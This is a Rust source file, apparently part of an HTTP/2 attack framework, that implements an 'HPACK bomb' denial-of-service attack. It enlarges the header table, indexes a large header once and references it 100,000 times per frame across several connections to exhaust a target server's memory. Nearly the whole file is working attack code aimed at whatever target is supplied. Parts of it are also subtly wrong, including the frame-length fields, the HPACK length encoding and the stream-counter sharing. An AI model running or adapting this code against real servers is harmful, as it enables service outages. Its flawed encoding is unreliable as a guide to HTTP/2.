//! HPACK Bomb Attack - Header Compression Exploit
//!
//! This attack exploits HTTP/2 HPACK header compression to create a
//! compression bomb that expands to consume excessive server memory.
//!
//! The attack works by:
//! 1. Sending a SETTINGS frame to increase HEADER_TABLE_SIZE
//! 2. Encoding a large header value (e.g., 4000 bytes) with indexing
//! 3. Adding this value to the dynamic table
//! 4. Referencing it many times using 1-byte indexed representations
//! 5. Small wire size (~N+overhead bytes) expands to N * 4000 bytes
//!
//! This can exhaust server memory during HPACK decompression.

use std::sync::Arc;
use std::time::{Duration, Instant};

use bytes::Bytes;
use phoenix_core::RawH2Connection;
use phoenix_metrics::AttackMetrics;
use tracing::{info, warn, error};

use crate::{Attack, AttackContext, AttackError, AttackResult, parse_target};

/// HPACK Bomb Attack implementation
pub struct HpackBombAttack {
    /// Size of the large header value to encode
    header_value_size: usize,
    
    /// Number of times to reference the indexed header
    references: u32,
    
    /// Number of concurrent connections
    connections: usize,
}

impl HpackBombAttack {
    /// Create a new HpackBombAttack with default configuration
    pub fn new() -> Self {
        Self {
            header_value_size: 4000,
            references: 100_000,
            connections: 1,
        }
    }
    
    /// Set the header value size
    pub fn with_header_value_size(mut self, size: usize) -> Self {
        self.header_value_size = size;
        self
    }
    
    /// Set the number of references
    pub fn with_references(mut self, references: u32) -> Self {
        self.references = references;
        self
    }
    
    /// Set the number of concurrent connections
    pub fn with_connections(mut self, connections: usize) -> Self {
        self.connections = connections;
        self
    }
    
    /// Build a SETTINGS frame to increase HEADER_TABLE_SIZE
    fn build_settings_frame(&self) -> Bytes {
        use bytes::BufMut;
        
        // SETTINGS frame with HEADER_TABLE_SIZE = 65536 (0x0001 = 0x10000)
        let mut buf = bytes::BytesMut::with_capacity(15);
        
        // Frame length: 6 bytes for settings (2 bytes identifier + 4 bytes value)
        buf.put_u32(6);
        
        // Frame type: SETTINGS (0x04)
        buf.put_u8(0x04);
        
        // Flags: ACK=0
        buf.put_u8(0x00);
        
        // Stream identifier: 0 for settings
        buf.put_u32(0);
        
        // Setting: HEADER_TABLE_SIZE (0x0001) = 65536 (0x00010000)
        buf.put_u16(0x0001);
        buf.put_u32(65536);
        
        buf.freeze()
    }
    
    /// Build a HEADERS frame with HPACK bomb
    fn build_hpack_bomb_frame(&self, stream_id: u32) -> Bytes {
        use bytes::BufMut;
        
        // Build HPACK-encoded headers block
        let headers_block = self.build_hpack_bomb_block();
        let headers_len = headers_block.len();
        
        let mut buf = bytes::BytesMut::with_capacity(9 + headers_len);
        
        // Frame length
        buf.put_u32(headers_len as u32);
        
        // Frame type: HEADERS (0x01)
        buf.put_u8(0x01);
        
        // Flags: END_STREAM=1, END_HEADERS=1, PADDED=0, PRIORITY=0
        buf.put_u8(0x05); // END_STREAM | END_HEADERS
        
        // Stream identifier
        buf.put_u32(stream_id);
        
        // Headers block fragment (HPACK bomb)
        buf.extend_from_slice(&headers_block);
        
        buf.freeze()
    }
    
    /// Build HPACK bomb block
    fn build_hpack_bomb_block(&self) -> Vec<u8> {
        use bytes::BufMut;
        
        let mut buf = bytes::BytesMut::new();
        
        // 1. First, add a large literal value to the dynamic table
        // Literal header field with incremental indexing — new name
        // Pattern: 0b01000000 (6-bit prefix for indexed name, but we use literal)
        // Actually, for new name: 0b01000000 (6-bit prefix = 64)
        // Since we're using a new name, we need to encode it
        
        // :method: GET (indexed - 2)
        buf.put_u8(0x82);
        
        // :path: / (indexed - 4)
        buf.put_u8(0x84);
        
        // Custom header with large value
        // Header name: "x-bomb" (literal, Huffman encoded)
        let name = b"x-bomb";
        let name_len = name.len();
        
        // Literal header field with incremental indexing — new name
        // First byte: 0b01000000 (6-bit prefix = 64, meaning literal with indexing)
        // Since name_len < 127, we can use single byte length
        buf.put_u8(0x40 | name_len as u8); // 0x40 = 64 = indexing, name_len in lower 6 bits
        
        // Header name
        buf.extend_from_slice(name);
        
        // Header value: large string
        let value = vec![b'a'; self.header_value_size];
        let value_len = value.len();
        
        // Encode value length (Huffman encoded would be smaller, but we want large)
        // Use simple literal representation
        if value_len < 127 {
            buf.put_u8(value_len as u8);
        } else {
            // For values >= 127, use prefix encoding
            buf.put_u8(0x7F); // 127 with continuation bit
            buf.put_u8((value_len - 127) as u8);
        }
        
        // Header value
        buf.extend_from_slice(&value);
        
        // 2. Now reference the indexed header many times
        // After adding to dynamic table, it gets index 62 (assuming empty table start)
        // We'll reference it N times
        for _ in 0..self.references {
            // Add another header that references our bomb value
            // :method: GET again (indexed - 2)
            buf.put_u8(0x82);
            
            // Reference our bomb header (index 62 + i, but we'll use a safe index)
            // For demonstration, we'll add new headers each time
            // Actually, to create bomb, we should reference same index many times
            // Indexed header field: 1xxxxxxx (7-bit prefix)
            // Let's assume our header is at index 62
            buf.put_u8(0xBE); // 0xBE = 10111110 = index 62 (with MSB set)
        }
        
        buf.to_vec()
    }
}

#[async_trait]
impl Attack for HpackBombAttack {
    fn name(&self) -> &str {
        "http2-hpack-bomb"
    }
    
    fn description(&self) -> &str {
        "HPACK Bomb Attack. Exploits HTTP/2 header compression by adding a large value to the dynamic table and referencing it many times with 1-byte indexes, causing massive memory expansion during decompression."
    }
    
    async fn run(&self, ctx: AttackContext) -> Result<AttackResult, AttackError> {
        info!("Starting HPACK Bomb Attack against {}", ctx.target);
        
        let (target_host, target_port) = parse_target(&ctx.target)?;
        
        // Use context values if provided, otherwise use struct defaults
        let header_value_size = ctx.extra.get("header_value_size")
            .and_then(|s| s.parse().ok())
            .unwrap_or(self.header_value_size);
        let references = ctx.extra.get("references")
            .and_then(|s| s.parse().ok())
            .unwrap_or(self.references);
        let connections = if ctx.connections > 0 { ctx.connections } else { self.connections };
        
        info!("Configuration: {} connections, {} byte header value, {} references", 
              connections, header_value_size, references);
        
        let metrics = ctx.metrics.clone();
        let start_time = Instant::now();
        
        let mut total_requests = 0u64;
        let mut errors = 0u64;
        let mut next_stream_id = 1u32;
        
        // Launch attack on multiple connections
        let mut tasks = Vec::new();
        for conn_idx in 0..connections {
            let target_host = target_host.clone();
            let metrics = metrics.clone();
            let start_time = start_time;
            let duration = ctx.duration;
            
            let task = tokio::spawn(async move {
                let mut conn_requests = 0u64;
                let mut conn_errors = 0u64;
                
                // Connect to target
                let mut connection = match RawH2Connection::connect(&target_host, target_port).await {
                    Ok(conn) => conn,
                    Err(e) => {
                        error!("Connection {} failed: {}", conn_idx, e);
                        return (0, 1);
                    }
                };
                
                // Perform handshake
                if let Err(e) = connection.handshake().await {
                    error!("Connection {} handshake failed: {}", conn_idx, e);
                    return (0, 1);
                }
                
                // Send SETTINGS frame to increase header table size
                let settings_frame = HpackBombAttack::new().build_settings_frame();
                if let Err(e) = connection.send_frame(settings_frame).await {
                    error!("Failed to send SETTINGS frame: {}", e);
                    conn_errors += 1;
                }
                
                // Send HPACK bomb frames
                while start_time.elapsed() < duration {
                    let stream_id = next_stream_id;
                    next_stream_id = next_stream_id.wrapping_add(2);
                    
                    let attack = HpackBombAttack::new()
                        .with_header_value_size(header_value_size)
                        .with_references(references);
                    
                    let headers_frame = attack.build_hpack_bomb_frame(stream_id);
                    
                    if let Err(e) = connection.send_frame(headers_frame).await {
                        error!("Failed to send HPACK bomb frame: {}", e);
                        conn_errors += 1;
                        break;
                    }
                    
                    conn_requests += 1;
                    metrics.increment_requests();
                    
                    // Small yield
                    if conn_requests % 100 == 0 {
                        tokio::task::yield_now().await;
                    }
                }
                
                (conn_requests, conn_errors)
            });
            
            tasks.push(task);
        }
        
        // Collect results
        for task in tasks {
            match task.await {
                Ok((requests, errs)) => {
                    total_requests += requests;
                    errors += errs;
                }
                Err(e) => {
                    error!("Task failed: {}", e);
                    errors += 1;
                }
            }
        }
        
        let actual_duration = start_time.elapsed();
        let snapshot = metrics.snapshot();
        
        info!("Attack completed: {} requests, {} errors, duration: {:?}", 
              total_requests, errors, actual_duration);
        
        // Calculate compression ratio
        let wire_size = total_requests * (9 + 2 + 1 + (references as u64)) as u64; // Approximate
        let decompressed_size = total_requests * (header_value_size as u64 * references as u64);
        let ratio = if wire_size > 0 {
            decompressed_size as f64 / wire_size as f64
        } else {
            0.0
        };
        
        info!("Compression bomb ratio: {:.1}x ({} bytes → {} bytes)", 
              ratio, wire_size, decompressed_size);
        
        Ok(AttackResult {
            success: true,
            total_requests,
            errors,
            duration: actual_duration,
            snapshot,
        })
    }
}

impl Default for HpackBombAttack {
    fn default() -> Self {
        Self::new()
    }
}